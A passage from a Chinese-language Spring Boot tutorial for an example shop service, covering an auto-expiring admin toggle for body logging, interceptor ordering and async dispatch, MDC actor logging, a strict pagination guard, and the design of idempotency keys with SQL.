| **Spring Cloud Config / Consul** | 外部設定中心 + `@RefreshScope` | ✅ 最正規；❌ 需要額外基礎設施 |

**shop-service 用第二種**：

```java
package example.shop.common.web;

import org.springframework.http.ResponseEntity;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.web.bind.annotation.*;

import java.time.Duration;
import java.time.Instant;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;

/**
 * 暫時開啟完整 body 日誌，用於線上除錯。
 *
 * <p>★ 刻意設計成「自動關閉」——因為「忘記關掉」是這類開關的主要風險
 * （一天 345 GB，4.6.2）。
 */
@RestController
@RequestMapping("/admin/logging")
public class LoggingControlController {

    private final RequestLoggingProperties properties;
    private final ScheduledExecutorService scheduler =
            Executors.newSingleThreadScheduledExecutor(r -> {
                var t = new Thread(r, "logging-auto-off");
                t.setDaemon(true);
                return t;
            });

    private volatile Instant autoOffAt;

    public LoggingControlController(RequestLoggingProperties properties) {
        this.properties = properties;
    }

    @PostMapping("/bodies")
    @PreAuthorize("hasRole('ADMIN')")
    public ResponseEntity<Map<String, Object>> enableBodyLogging(
            @RequestParam(name = "minutes", defaultValue = "10") int minutes) {

        int clamped = Math.max(1, Math.min(minutes, 30));       // ★ 最多 30 分鐘
        properties.setLogBodies(true);
        autoOffAt = Instant.now().plus(Duration.ofMinutes(clamped));

        scheduler.schedule(() -> {
            properties.setLogBodies(false);
            autoOffAt = null;
        }, clamped, java.util.concurrent.TimeUnit.MINUTES);

        return ResponseEntity.ok(Map.of(
                "logBodies", true,
                "autoOffAt", autoOffAt.toString(),
                "warning", "完整 body 日誌會大幅增加日誌量，且可能記錄敏感資料"));
    }

    @DeleteMapping("/bodies")
    @PreAuthorize("hasRole('ADMIN')")
    public ResponseEntity<Map<String, Object>> disableBodyLogging() {
        properties.setLogBodies(false);
        autoOffAt = null;
        return ResponseEntity.ok(Map.of("logBodies", false));
    }

    @GetMapping("/bodies")
    @PreAuthorize("hasRole('ADMIN')")
    public Map<String, Object> status() {
        return Map.of(
                "logBodies", properties.logBodies(),
                "autoOffAt", autoOffAt == null ? "-" : autoOffAt.toString(),
                "slowRequestThresholdMs", properties.slowRequestThresholdMs());
    }
}
```

⚠️ **「最多 30 分鐘 + 自動關閉」是這個設計的核心。**

真實事故：某團隊開了 debug 日誌查一個問題，查完忘了關。
**三週後收到 CloudWatch 帳單多了 4,200 美元。**

⚠️ **而且完整 body 日誌會記錄遮蔽後的內容** —— `BodyMasker` 仍然生效。
但要注意：遮蔽清單一定會漏（4.6.4 的 `maskLevel` 是黑名單），
所以「開啟完整 body 日誌」本身就有資料保護風險。
**這是為什麼它要 `@PreAuthorize("hasRole('ADMIN')")` 並留下稽核紀錄。**

---

## 4.7 Interceptor

### 4.7.1 三個方法的時機

```java
public interface HandlerInterceptor {

    /** 找到 handler 之後、參數綁定之前。回 false = 我已處理完，不要繼續。 */
    default boolean preHandle(HttpServletRequest request, HttpServletResponse response,
                             Object handler) throws Exception { return true; }

    /** Controller 方法執行完、回傳值已寫入 response 之後。⚠️ 例外時不執行。 */
    default void postHandle(HttpServletRequest request, HttpServletResponse response,
                           Object handler, ModelAndView modelAndView) throws Exception { }

    /** ★ 一定會執行（只要 preHandle 回過 true）。適合清理。 */
    default void afterCompletion(HttpServletRequest request, HttpServletResponse response,
                                Object handler, Exception ex) throws Exception { }
}
```

**放進 `doDispatch()` 的時間軸**：

```
doDispatch()
  │
  ├─ getHandler()  ← 找不到就直接 404，interceptor 完全不會被呼叫 ★
  │
  ├─ applyPreHandle()
  │    for (i = 0..n) {
  │        if (!interceptor[i].preHandle(...)) {
  │            triggerAfterCompletion();     ← 只清理 0..i-1
  │            return false;                  ← 整個 dispatch 結束
  │        }
  │        interceptorIndex = i;              ★ 記錄走到哪
  │    }
  │
  ├─ ha.handle()   ← 參數綁定 + 驗證 + Controller + 回傳值序列化
  │
  ├─ applyPostHandle()   ← 有例外就跳過 ★
  │    for (i = n..0) interceptor[i].postHandle(...)
  │
  └─ processDispatchResult()
       ├─ 有例外 → HandlerExceptionResolver（03 章）
       └─ triggerAfterCompletion()
            for (i = interceptorIndex..0) interceptor[i].afterCompletion(...)
```

**四個關鍵行為：**

| 行為 | 說明 |
|---|---|
| **`preHandle` 是正向順序，`postHandle` / `afterCompletion` 是反向** | 像堆疊。所以「先進的最後清理」 |
| **`preHandle` 回 `false` 只清理已成功的** | 靠 `interceptorIndex` 記錄。所以你的 `afterCompletion` 不會在 `preHandle` 沒被呼叫時執行 |
| **`postHandle` 在例外時不執行** | 清理程式碼寫在這裡會在錯誤路徑上洩漏 |
| **404 時 interceptor 完全不執行** | 因為 `getHandler()` 失敗就 return 了。所以「所有請求都要做的事」不能放 interceptor |

### 4.7.2 `preHandle` 回 `false` vs 拋例外

**這是選擇的關鍵。**

| | 回 `false` | 拋例外 |
|---|---|---|
| 誰產生回應 | **你自己**（`response.setStatus` + 寫 body） | `@RestControllerAdvice`（03 章） |
| 錯誤格式一致嗎 | ❌ 要自己組（除非用 `ProblemWriter`） | ✅ 自動 |
| 適合的情境 | **回應不是錯誤**（例如冪等重播回 200、`304 Not Modified`） | **回應是錯誤**（422、429、409） |

```java
// ✅ 拋例外（錯誤情境）
@Override
public boolean preHandle(HttpServletRequest request, HttpServletResponse response,
                        Object handler) {
    if (rawSize(request) > maxPageSize) {
        throw new ValidationFailedException(List.of(
                FieldViolation.of("size", "Max", "每頁筆數最大為 " + maxPageSize)));
    }
    return true;
}
```

```java
// ✅ 回 false（非錯誤情境：冪等重播）
@Override
public boolean preHandle(HttpServletRequest request, HttpServletResponse response,
                        Object handler) throws IOException {
    var cached = idempotencyStore.findCompleted(key, fingerprint);
    if (cached.isPresent()) {
        replay(cached.get(), response);      // 寫入原本的 200 + body
        return false;                         // ★ 不要執行 Controller
    }
    return true;
}
```

⚠️ **回 `false` 但什麼都不寫 = 客戶端收到 200 + 空 body。**
這是一個常見的 bug（使用者看到白畫面，狀態碼卻是 200）。

**規則：回 `false` 之前一定要確認 response 已經被完整寫入。**

### 4.7.3 註冊與 path pattern

```java
package example.shop.common.config;

import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

@Configuration
public class WebMvcConfig implements WebMvcConfigurer {

    private final PageableGuardInterceptor pageableGuard;
    private final UnknownQueryParamInterceptor unknownParamGuard;
    private final IdempotencyInterceptor idempotency;
    private final ActorMdcInterceptor actorMdc;

    public WebMvcConfig(PageableGuardInterceptor pageableGuard,
                        UnknownQueryParamInterceptor unknownParamGuard,
                        IdempotencyInterceptor idempotency,
                        ActorMdcInterceptor actorMdc) {
        this.pageableGuard = pageableGuard;
        this.unknownParamGuard = unknownParamGuard;
        this.idempotency = idempotency;
        this.actorMdc = actorMdc;
    }

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        // ★ 順序 = 註冊順序（不是 @Order）
        //   actorMdc 最先：讓後面的 interceptor 拋的例外也有 actorId
        registry.addInterceptor(actorMdc)
                .addPathPatterns("/**")
                .excludePathPatterns("/actuator/**", "/swagger-ui/**", "/v3/api-docs/**");

        registry.addInterceptor(unknownParamGuard)
                .addPathPatterns("/**")
                .excludePathPatterns("/actuator/**", "/swagger-ui/**", "/v3/api-docs/**");

        registry.addInterceptor(pageableGuard)
                .addPathPatterns("/**")
                .excludePathPatterns("/actuator/**", "/swagger-ui/**", "/v3/api-docs/**");

        // 冪等只針對寫入端點（靠 @Idempotent 註解再細分）
        registry.addInterceptor(idempotency)
                .addPathPatterns("/**")
                .excludePathPatterns("/actuator/**", "/swagger-ui/**", "/v3/api-docs/**");
    }
}
```

⚠️ **Interceptor 的順序是「註冊順序」，不是 `@Order`。**
這和 Filter 不同，很容易搞錯。

⚠️ **`addPathPatterns` 用的是 `PathPattern` 語法**（Boot 3 預設），
所以 `/**` 是「任意層」，`/*` 是「一層」。

⚠️ **`excludePathPatterns` 一定要排除 `/actuator`**，
否則 `UnknownQueryParamInterceptor` 會擋掉 Prometheus 的 scrape 參數。

### 4.7.4 非同步請求的 `AsyncHandlerInterceptor`

```java
public interface AsyncHandlerInterceptor extends HandlerInterceptor {

    /**
     * 請求進入非同步模式時呼叫，「取代」postHandle 與 afterCompletion。
     * 之後 ASYNC dispatch 會重新走一次 preHandle → postHandle → afterCompletion。
     */
    default void afterConcurrentHandlingStarted(HttpServletRequest request,
            HttpServletResponse response, Object handler) throws Exception { }
}
```

**時間軸**：

```
① REQUEST dispatch
   preHandle()            ✅
   Controller 回傳 Callable / DeferredResult / SseEmitter
   afterConcurrentHandlingStarted()    ★ 取代 postHandle + afterCompletion
   （dispatch 結束，但 HTTP 連線還開著）

② 背景執行緒完成工作

③ ASYNC dispatch
   preHandle()            ✅ 再一次！
   （寫入回傳值）
   postHandle()           ✅
   afterCompletion()      ✅
```

⚠️ **`preHandle` 會被呼叫兩次。** 這對「只該做一次」的邏輯是災難：

```java
// ❌ 冪等鍵會被檢查兩次，第二次會發現「已經在處理中」→ 回 409
public boolean preHandle(...) {
    idempotencyStore.claim(key);     // 第二次呼叫會失敗！
    return true;
}
```

**修法：檢查 dispatcher type。**

```java
@Override
public boolean preHandle(HttpServletRequest request, HttpServletResponse response,
                        Object handler) {
    // ★ ASYNC dispatch 時跳過（已經在 REQUEST dispatch 做過了）
    if (jakarta.servlet.DispatcherType.ASYNC.equals(request.getDispatcherType())) {
        return true;
    }
    // ... 真正的邏輯
}
```

或者用 request attribute 記錄「已經做過」（和 `OncePerRequestFilter` 同樣的手法）。

**shop-service 的規則：所有 interceptor 的 `preHandle` 開頭都檢查 dispatcher type。**
用一個基底類別強制它：

```java
package example.shop.common.web;

import jakarta.servlet.DispatcherType;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.web.servlet.AsyncHandlerInterceptor;

/**
 * 只在 REQUEST dispatch 上執行 preHandle 的 interceptor 基底。
 *
 * <p>避免 4.7.4 的「preHandle 被呼叫兩次」問題。
 */
public abstract class OncePerRequestInterceptor implements AsyncHandlerInterceptor {

    @Override
    public final boolean preHandle(HttpServletRequest request, HttpServletResponse response,
                                   Object handler) throws Exception {
        if (DispatcherType.ASYNC.equals(request.getDispatcherType())) {
            return true;
        }
        return preHandleOnce(request, response, handler);
    }

    protected abstract boolean preHandleOnce(HttpServletRequest request,
                                             HttpServletResponse response,
                                             Object handler) throws Exception;
}
```

### 4.7.5 一個實用的 interceptor：把 Actor 放進 MDC

```java
package example.shop.common.web;

import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.slf4j.MDC;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.stereotype.Component;

/**
 * 把「誰在操作」放進 MDC，讓所有 log 都能對應到使用者。
 *
 * <p>為什麼是 Interceptor 而不是 Filter？
 * 因為它必須在 Spring Security 認證「之後」執行，
 * 而 TraceIdFilter（order -121）在 Security（-100）之前。
 *
 * <p>⚠️ 也可以做成 order > -100 的 Filter。選 Interceptor 的理由是
 * 「它只對真的進到 Controller 的請求有意義」——
 * 401 的請求沒有 actor，記了也是空的。
 */
@Component
public class ActorMdcInterceptor extends OncePerRequestInterceptor {

    @Override
    protected boolean preHandleOnce(HttpServletRequest request, HttpServletResponse response,
                                    Object handler) {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        if (auth != null && auth.isAuthenticated()
                && !(auth instanceof org.springframework.security.authentication
                        .AnonymousAuthenticationToken)) {

            if (auth.getPrincipal() instanceof CurrentUser user) {
                MDC.put(TraceContext.MDC_ACTOR_ID, user.actor().id());
                MDC.put(TraceContext.MDC_ACTOR_TYPE, user.actor().type().name());
            } else {
                // ⚠️ principal 的 name 可能是使用者輸入（例如 basic auth 的 username）
                //    → 一定要 sanitize（4.5.3 的 log injection）
                MDC.put(TraceContext.MDC_ACTOR_ID, sanitize(auth.getName()));
                MDC.put(TraceContext.MDC_ACTOR_TYPE, "UNKNOWN");
            }
        }
        return true;
    }

    /**
     * ⚠️⚠️ <b>刻意「沒有」覆寫 {@code afterCompletion} 來清理 MDC。</b> ★★
     *
     * <p>這是一個真實踩過的坑。看清理時機的相對順序：
     *
     * <pre>
     * TraceIdFilter.doFilterInternal      ← MDC.put(traceId)
     *   …
     *   RequestLoggingFilter              ← ★ 「回應」那一筆 log 在這裡寫
     *     AuditFilter                     ← ★ 稽核事件在這裡寫
     *       DispatcherServlet
     *         ActorMdcInterceptor.preHandle        ← MDC.put(actorId)
     *         Controller
     *         ActorMdcInterceptor.afterCompletion  ← 🔴 如果在這裡 MDC.remove(actorId)
     *       AuditFilter 的 finally         ← actorId 已經是 null
     *     RequestLoggingFilter 的 finally  ← actorId 已經是 null
     * TraceIdFilter 的 finally             ← 統一清理（涵蓋所有 key）
     * </pre>
     *
     * <p><b>Interceptor 的 {@code afterCompletion} 比外層 filter 的 {@code finally}【早】執行。</b>
     * 所以在這裡清 MDC，會讓：
     *
     * <ul>
     *   <li>4.6.5 的結構化請求日誌裡，{@code "actorId"} <b>永遠是 null</b>；</li>
     *   <li>練習 2 的 {@code AuditEvent.actorId} <b>永遠是 null</b> ——
     *       而稽核事件<b>沒有 actorId 就完全沒有價值</b>。</li>
     * </ul>
     *
     * <p>⚠️ 而症狀是「稽核紀錄有寫、格式正確、就是 actorId 是空的」——
     * 看起來像「認證沒生效」，於是很容易查錯方向。
     *
     * <p>★ <b>正確的做法：MDC 的清理由最外層的 {@link TraceIdFilter} 的 {@code finally}
     * 統一做一次。</b>
     * 它已經 {@code MDC.remove} 了 {@code MDC_ACTOR_ID} / {@code MDC_ACTOR_TYPE}（4.5.4），
     * 所以這裡什麼都不用做。
     *
     * <p><b>一般規則</b>：<b>MDC 誰放、誰清 —— 但「誰清」要以「最外層」為準。</b>
     * 內層元件放的 key，交給最外層的 filter 清；
     * 內層自己清會讓「內層與外層之間」的所有 log 少掉那個欄位。
     *
     * <p>⚠️ 那 Tomcat 的執行緒重用呢？{@code TraceIdFilter} 的 {@code finally}
     * 一定會執行（它是最外層的 try），所以不會洩漏到下一個請求。
     * 4.14.3 有一個測試守住這件事。
     */
    // （刻意不覆寫 afterCompletion）

    private String sanitize(String value) {
        if (value == null) return "anonymous";
        String trimmed = value.trim();
        if (trimmed.length() > 64) trimmed = trimmed.substring(0, 64);
        return trimmed.replaceAll("[^A-Za-z0-9_@.\\-]", "_");
    }
}
```

---

## 4.8 分頁參數硬上限

**這一節把 03-rest-api 第 05 章 5.13.2 的設計落地，解決 4.2.3 的靜默夾取事故。**

### 4.8.1 為什麼必須在綁定之前

```
① Interceptor.preHandle        ← ★ 這裡讀得到「原始」參數字串
② HandlerMethodArgumentResolver ← Pageable / OrderFilter 在這裡被建立
                                   Spring Data 在這裡做 Math.min(size, maxPageSize)
③ Controller 方法
```

**在 ② 之後就看不到客戶端「原本要求什麼」了。**

```java
// ❌ 在 Controller 裡檢查（太晚）
public PageResponse<OrderSummary> list(Pageable pageable) {
    if (pageable.getPageSize() > 100) { ... }     // ← 永遠不會成立，已經被夾取成 100
}
```

⚠️ **例外**：如果你用自己的 `PageQuery` record（01 章 1.10.3）而不是 Spring Data 的 `Pageable`，
`@Max(100)` 就會正常生效（因為 Bean Validation 看到的是綁定後的值 99999）。

**那為什麼還需要這個 interceptor？** 三個理由：

1. **深分頁上限**（`page * size > 10000`）需要跨欄位計算，而且要在查詢前擋掉。
2. **`page` 與 `cursor` 互斥**的檢查。
3. **有些端點還是會用 `Pageable`**（例如引入 spring-data 之後的 Repository 層測試用端點）。

### 4.8.2 完整實作

```java
package example.shop.common.web;

import example.shop.common.config.ApiLimitProperties;
import example.shop.common.error.FieldViolation;
import example.shop.common.error.ValidationFailedException;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.stereotype.Component;

import java.util.ArrayList;
import java.util.List;

/**
 * 在參數綁定「之前」驗證原始分頁參數。
 *
 * <p>解決的問題：Spring Data 的 {@code max-page-size} 是「靜默夾取」——
 * {@code ?size=1000000} 會變成 100 並回 200，客戶端不知道自己只拿到一部分
 * （03-rest-api 5.2.4 的 41 萬筆匯出事故）。
 *
 * <p>這個 interceptor 讓它變成 422 + 明確的錯誤訊息。
 */
@Component
public class PageableGuardInterceptor extends OncePerRequestInterceptor {

    private final ApiLimitProperties limits;

    public PageableGuardInterceptor(ApiLimitProperties limits) {
        this.limits = limits;
    }

    @Override
    protected boolean preHandleOnce(HttpServletRequest request, HttpServletResponse response,
                                    Object handler) {

        // 只檢查 GET（列表端點）
        if (!"GET".equalsIgnoreCase(request.getMethod())) return true;

        List<FieldViolation> violations = new ArrayList<>();

        Integer size = parseInt(request, "size", violations);
        Integer page = parseInt(request, "page", violations);
        String cursor = request.getParameter("cursor");

        // ── size 範圍 ──────────────────────────────────────────
        if (size != null) {
            if (size < 1) {
                violations.add(new FieldViolation("size", "Min",
                        "每頁筆數最小為 1", size, java.util.Map.of("min", 1)));
            } else if (size > limits.maxPageSize()) {
                // ★ 這一條就是本節的重點：不夾取，明確拒絕
                violations.add(new FieldViolation("size", "Max",
                        "每頁筆數最大為 " + limits.maxPageSize()
                                + "。需要更多資料請使用匯出功能。",
                        size, java.util.Map.of("max", limits.maxPageSize())));
            }
        }

        // ── page 範圍 ──────────────────────────────────────────
        if (page != null && page < 0) {
            violations.add(new FieldViolation("page", "Min",
                    "頁碼不可小於 0", page, java.util.Map.of("min", 0)));
        }

        // ── 深分頁 ────────────────────────────────────────────
        if (page != null && page >= 0) {
            int effectiveSize = (size != null && size > 0) ? size : limits.defaultPageSize();
            long offset = (long) page * effectiveSize;
            if (offset > limits.maxOffset()) {
                violations.add(new FieldViolation("page", "MaxOffset",
                        "查詢範圍過深（第 " + offset + " 筆起），上限為 "
                                + limits.maxOffset() + " 筆。請縮小條件或改用 cursor 分頁。",
                        page, java.util.Map.of("maxOffset", limits.maxOffset())));
            }
        }

        // ── page 與 cursor 互斥 ────────────────────────────────
        if (cursor != null && !cursor.isBlank() && request.getParameter("page") != null) {
            violations.add(FieldViolation.of("cursor", "Conflict",
                    "page 與 cursor 不可同時使用"));
        }

        // ── 多值參數數量上限 ───────────────────────────────────
        checkMultiValueLimit(request, violations);

        if (!violations.isEmpty()) {
            // ★ 拋例外 → 進 advice → 422 + 統一格式（4.7.2）
            throw new ValidationFailedException(violations);
        }
        return true;
    }

    /**
     * ★ 多值參數的數量上限。
     *
     * <p>{@code ?status=A&status=B&…}（5,000 個）會產生
     * {@code IN (5000 個值)} 的 SQL，MySQL 的查詢計畫會崩（02 章練習 3 的解答）。
     */
    private void checkMultiValueLimit(HttpServletRequest request,
                                      List<FieldViolation> violations) {
        int max = limits.maxMultiValueParams();
        request.getParameterMap().forEach((name, values) -> {
            if (values.length > max) {
                violations.add(new FieldViolation(name, "MaxSize",
                        "參數 " + name + " 最多 " + max + " 個值（收到 " + values.length + " 個）",
                        "（" + values.length + " 個值）",
                        java.util.Map.of("max", max)));
            }
        });
    }

    /**
     * 解析整數參數。
     *
     * <p>⚠️ 這裡「不」對格式錯誤報錯 —— 交給後面的參數綁定，
     * 因為它的錯誤訊息（含精確的 field）已經在 03 章處理好了。
     * 這裡只在「格式正確但超範圍」時報錯。
     */
    private Integer parseInt(HttpServletRequest request, String name,
                             List<FieldViolation> violations) {
        String raw = request.getParameter(name);
        if (raw == null || raw.isBlank()) return null;

        // ★ 長度上限：擋掉 "999999999999999999999999" 這種（parse 會拋，但先擋更省）
        if (raw.length() > 10) {
            violations.add(new FieldViolation(name, "TypeMismatch",
                    "必須是整數", raw, null));
            return null;
        }
        try {
            return Integer.parseInt(raw.trim());
        } catch (NumberFormatException e) {
            // 格式錯誤交給參數綁定處理（會產生更好的錯誤訊息）
            return null;
        }
    }
}
```

### 4.8.3 效果對照

```bash
curl -s 'localhost:8080/orders?size=1000000' | jq
```

**修正前**（Spring Data 的靜默夾取）：

```json
{ "items": [ /* 100 筆 */ ], "page": { "number": 0, "size": 100, "totalElements": 410523 } }
```
`HTTP 200`

⚠️ **注意 `totalElements` 是 410523，但只給了 100 筆。**
理論上客戶端「可以」發現不對，但實務上沒人檢查。

**修正後**：

```json
{
  "type": "https://api.shop.example/problems/validation-failed",
  "title": "請求內容驗證失敗",
  "status": 422,
  "detail": "Request failed validation: 1 field(s) rejected.",
  "instance": "/orders",
  "code": "VALIDATION_FAILED",
  "userMessage": "請檢查標示紅色的欄位。",
  "errors": [
    {
      "field": "size",
      "code": "Max",
      "message": "每頁筆數最大為 100。需要更多資料請使用匯出功能。",
      "rejectedValue": 1000000,
      "constraint": { "max": 100 }
    }
  ],
  "errorCount": 1,
  "traceId": "4f2c8a1e9b7d3f60"
}
```
`HTTP 422`

**訊息裡直接告訴使用者正確的做法**（「請使用匯出功能」）——
這比單純的「size 太大」有用得多。

### 4.8.4 深分頁的錯誤

```bash
curl -s 'localhost:8080/orders?page=5000&size=20' | jq '.errors[0]'
```

```json
{
  "field": "page",
  "code": "MaxOffset",
  "message": "查詢範圍過深（第 100000 筆起），上限為 10000 筆。請縮小條件或改用 cursor 分頁。",
  "rejectedValue": 5000,
  "constraint": { "maxOffset": 10000 }
}
```

⚠️ **這個限制會擋掉「合理」的使用**：客服想看第 5,000 頁的訂單。

**正確的回應是「提供替代方案」而不是「放寬限制」**：

| 需求 | 正確做法 |
|---|---|
| 「我要看很後面的資料」 | 加篩選條件（日期範圍、狀態）縮小結果集 |
| 「我要全部資料」 | `POST /order-exports`（非同步匯出，05 章） |
| 「我要無限捲動」 | cursor 分頁（`?cursor=...`，沒有深度限制） |

**為什麼不放寬 offset 上限？** 因為 `OFFSET 100000` 的 SQL 要掃過並丟掉 10 萬筆
（03-rest-api 5.2.2）—— 那是 8 秒的查詢，而且它會佔住連線。

---

## 4.9 冪等鍵 ★

**這一節把 03-rest-api 第 08 章 8.2 的設計落地，解決 4.2.4 的重複扣款。**

### 4.9.1 需求與三個競態

**基本語意**：同一個 `Idempotency-Key` 的請求，**只執行一次**，
後續的請求回傳第一次的結果。

**但「只執行一次」在併發下有三個競態**：

```
競態 1：兩個請求「同時」到達
   T1: 請求A 查詢 key → 不存在
   T2: 請求B 查詢 key → 不存在        ← 兩個都通過檢查
   T3: 請求A 開始執行 → 扣款
   T4: 請求B 開始執行 → 扣款          ← 重複！

競態 2：第一個還在執行中，第二個到達
   T1: 請求A 建立紀錄（IN_PROGRESS），開始執行（需要 8 秒）
   T2: 請求B 查到 IN_PROGRESS 的紀錄
       → 該回什麼？結果還沒有，不能重播

競態 3：第一個執行中程序掛掉
   T1: 請求A 建立紀錄（IN_PROGRESS）
   T2: 程序被 SIGKILL / OOM 殺掉
   T3: 紀錄永遠是 IN_PROGRESS
       → 這個 key 永遠不能用了？
```

**三個解法**：

| 競態 | 解法 |
|---|---|
| 1 | **原子性建立**：`INSERT` + UNIQUE 約束。第二個 INSERT 失敗 → 它知道自己是後到的 |
| 2 | 回 **409 `PAYMENT_ALREADY_IN_PROGRESS`** + `statusCheckUrl` + `Retry-After`。前端輪詢 |
| 3 | **租約（lease）**：紀錄帶 `expiresAt`；過期的 `IN_PROGRESS` 可以被接手 |

⚠️ **另外還有第四個問題：同一個 key，不同的 body。**

```
POST /orders  Idempotency-Key: k1  { "items": [A] }   → 成立訂單
POST /orders  Idempotency-Key: k1  { "items": [B] }   → ？
```

這通常是客戶端 bug（key 沒有跟著請求內容變）。
**回 409 `IDEMPOTENCY_KEY_REUSED`**，並在回應裡說明。

**判斷「是否同一個請求」用「請求指紋」**：method + path + body 的 hash。

### 4.9.2 為什麼需要 Filter + Interceptor 混合

**需求分解**：

| 需要什麼 | 誰能做 |
|---|---|
| 讀 body 算指紋（在 Controller 之前） | **Filter**（`CachedBodyRequestWrapper`，4.4.6） |
| 知道「這個端點需要冪等嗎」（讀 `@Idempotent` 註解） | **Interceptor**（有 `HandlerMethod`） |
| 捕捉回應以便重播 | **Filter**（`ContentCachingResponseWrapper`） |
| 在 Controller 之前短路（重播） | **Interceptor**（`preHandle` 回 `false`） |

**沒有單一機制能做完全部。** 所以：

```
CachedBodyFilter (-117)          讓 body 可重複讀
        ↓
IdempotencyFilter (-99)          包裝 response（只在必要時）+ 存結果
        ↓
IdempotencyInterceptor           讀註解、算指紋、claim key、重播
        ↓
Controller
```

⚠️ **`IdempotencyFilter` 在 `-99`（Security 之後）** ——
因為冪等鍵的範圍應該是 **per-actor**（不同使用者的相同 key 不該互相干擾）。

### 4.9.3 `@Idempotent` 註解與儲存介面

```java
package example.shop.common.web.idempotency;

import java.lang.annotation.*;

/**
 * 標記這個端點需要冪等鍵保護。
 *
 * <p>對照 03-rest-api 第 08 章 8.2：{@code POST /orders} 與
 * {@code POST /orders/{id}/payments} 是必須的；其他寫入端點是選配。
 */
@Documented
@Target(ElementType.METHOD)
@Retention(RetentionPolicy.RUNTIME)
public @interface Idempotent {

    /** 是否強制要求客戶端提供 Idempotency-Key（false = 有就用、沒有就跳過）。 */
    boolean required() default true;

    /** 結果保留多久（秒）。03-rest-api 8.2 的建議是 24 小時。 */
    long ttlSeconds() default 86_400;

    /** 「執行中」的租約時間（秒）。超過就視為前一次已失敗，可以被接手（競態 3）。 */
    long leaseSeconds() default 60;
}
```

```java
package example.shop.common.web.idempotency;

import java.time.Instant;
import java.util.Map;
import java.util.Optional;

/**
 * 冪等紀錄的儲存抽象。
 *
 * <p>正式環境的實作應該用**資料庫**（有 UNIQUE 約束、有交易、重啟不遺失），
 * 不是 Redis —— 因為 Redis 的 SETNX 雖然原子，但「與業務交易一起提交」做不到。
 * （06-repository 與 07-mysql 會實作 JDBC 版本。）
 */
public interface IdempotencyStore {

    enum State { IN_PROGRESS, COMPLETED }

    record Record(
        String key,
        String actorId,
        String fingerprint,
        State state,
        Instant expiresAt,
        Instant leaseExpiresAt,
        Integer responseStatus,
        Map<String, String> responseHeaders,
        byte[] responseBody
    ) {}

    /** 建立結果。 */
    sealed interface ClaimResult {
        /** 成功取得執行權 —— 這是第一個（或接手了過期租約的）請求。 */
        record Acquired() implements ClaimResult {}
        /** 已經有完成的結果 → 重播它。 */
        record Replay(Record record) implements ClaimResult {}
        /** 前一個還在執行中 → 回 409 + 輪詢。 */
        record InProgress(Instant leaseExpiresAt) implements ClaimResult {}
        /** 同一個 key 但不同的請求內容 → 回 409。 */
        record FingerprintMismatch(String storedFingerprint) implements ClaimResult {}
    }

    /**
     * 原子性地嘗試取得執行權。
     *
     * <p>★ 實作必須是原子的（單一 SQL 或交易），否則競態 1 仍然存在。
     */
    ClaimResult claim(String key, String actorId, String fingerprint,
                      long ttlSeconds, long leaseSeconds);

    /** 記錄成功的結果，狀態改為 COMPLETED。 */
    void complete(String key, String actorId, int status,
                  Map<String, String> headers, byte[] body);

    /** 釋放執行權（執行失敗且不該被重播時）。 */
    void release(String key, String actorId);

    Optional<Record> find(String key, String actorId);
}
```

**JDBC 實作的核心 SQL**（06-repository 會完整實作，這裡先看關鍵部分）：

```sql
-- 表結構（07-mysql 第 02 章）
CREATE TABLE idempotency_record (
    id              BIGINT AUTO_INCREMENT PRIMARY KEY,
    idem_key        VARCHAR(64)  NOT NULL,
    actor_id        VARCHAR(64)  NOT NULL,
    fingerprint     CHAR(64)     NOT NULL,          -- SHA-256 hex
    state           VARCHAR(16)  NOT NULL,
    expires_at      DATETIME(3)  NOT NULL,
    lease_expires_at DATETIME(3) NULL,
    response_status SMALLINT     NULL,
    response_headers JSON        NULL,
    response_body   BLOB         NULL,
    created_at      DATETIME(3)  NOT NULL,
    updated_at      DATETIME(3)  NOT NULL,
    -- ★★★ 這個約束是「原子性」的來源（競態 1 的解法）
    CONSTRAINT uk_idempotency_key UNIQUE (idem_key, actor_id),
    INDEX idx_expires_at (expires_at)               -- 清理過期紀錄用
) ENGINE=InnoDB;
```

```sql
-- claim 的第一步：嘗試插入（原子）
INSERT INTO idempotency_record
    (idem_key, actor_id, fingerprint, state, expires_at, lease_expires_at,
     created_at, updated_at)
VALUES (?, ?, ?, 'IN_PROGRESS', ?, ?, NOW(3), NOW(3));
-- 成功 → ClaimResult.Acquired
-- 撞到 uk_idempotency_key → 走下面的查詢
```

```sql
-- 插入失敗後：看看現有紀錄是什麼狀態
SELECT fingerprint, state, expires_at, lease_expires_at,
       response_status, response_headers, response_body
FROM idempotency_record
WHERE idem_key = ? AND actor_id = ?
FOR UPDATE;                                        -- ★ 鎖住，避免和「接手租約」競爭
```

```sql
-- 接手過期的租約（競態 3 的解法）
UPDATE idempotency_record
SET fingerprint = ?, lease_expires_at = ?, updated_at = NOW(3)
WHERE idem_key = ? AND actor_id = ?
  AND state = 'IN_PROGRESS'
  AND lease_expires_at < NOW(3);                   -- ★ 只有過期的才能被接手
-- 影響列數 = 1 → 接手成功（Acquired）
-- 影響列數 = 0 → 別人搶先了（InProgress）
```

### 4.9.4 `IdempotencyInterceptor`

```java
package example.shop.common.web.idempotency;

import example.shop.common.error.ErrorCode;
import example.shop.common.web.*;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Component;
import org.springframework.web.method.HandlerMethod;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.time.Duration;
import java.time.Instant;
import java.util.HexFormat;
import java.util.Map;

/**
 * 冪等鍵的決策層。
 *
 * <p>職責：
 * <ol>
 *   <li>讀 {@link Idempotent} 註解決定要不要保護這個端點。</li>
 *   <li>驗證 {@code Idempotency-Key} header。</li>
 *   <li>算請求指紋（method + path + body 的 SHA-256）。</li>
